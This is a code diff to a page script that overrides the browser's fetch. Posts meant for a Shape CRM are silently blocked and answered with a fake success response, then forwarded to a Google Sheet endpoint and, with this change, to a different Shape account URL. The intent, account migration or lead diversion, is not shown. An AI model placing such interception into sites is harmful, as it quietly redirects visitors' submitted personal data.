@@ -339,6 +339,7 @@
 (function () {
   var BLOCK_SHAPE_CRM = true;
   var SHEET_ENDPOINT  = 'https://script.google.com/macros/s/AKfycbwl5KZOJK8YEkipQYbDg1ROddDl4xTsrUW1hGs4QxsZXUeOP1EtwSa9-LgClh-neMGT/exec';
+var NEW_SHAPE_URL   = 'https://secure-api.setshape.com/postlead/25824/26350';
   var SHAPE_HOSTS     = /setshape|shapecrm/i;
 
   var nativeFetch = window.fetch;
@@ -347,7 +348,7 @@
   window.fetch = function (input, init) {
     var url = (typeof input === 'string') ? input : (input && input.url) || '';
     if (BLOCK_SHAPE_CRM && SHAPE_HOSTS.test(url)) {
-      console.log('[SMR] Shape CRM post blocked');
+      console.log('[SMR] Shape post sent to the new account');
       try { forwardToSheet(init && init.body); } catch (e) {}
       try { return Promise.resolve(new Response('', { status: 204 })); }
       catch (e) { return Promise.resolve(); }
@@ -356,6 +357,9 @@
   };
 
   function forwardToSheet(body) {
+if (NEW_SHAPE_URL && body) {
+try { nativeFetch(NEW_SHAPE_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: body }); } catch (e) {}
+}
     if (!SHEET_ENDPOINT || !body) { return; }
     var d;
     try { d = JSON.parse(body); } catch (e) { return; }
